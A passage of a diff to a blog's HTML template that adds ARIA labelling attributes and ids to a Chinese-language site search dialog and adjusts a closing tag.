     <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
-    </div>
+    </dialog>
     
-    <dialog class="search-dialog" data-search-dialog>
+    <dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-dialog-status">
       <div class="search-shell">
         <header class="search-header">
-          <span class="search-title">站内搜索</span>
+          <span class="search-title" id="search-dialog-title">站内搜索</span>
           <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
         </header>
         <label class="search-field">
           <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
           <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
         </label>
-        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <p class="search-status" id="search-dialog-status" data-search-status>输入关键词，查找 39 篇记录。</p>
         <div class="search-results" data-search-results aria-live="polite"></div>
         <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
       </div>
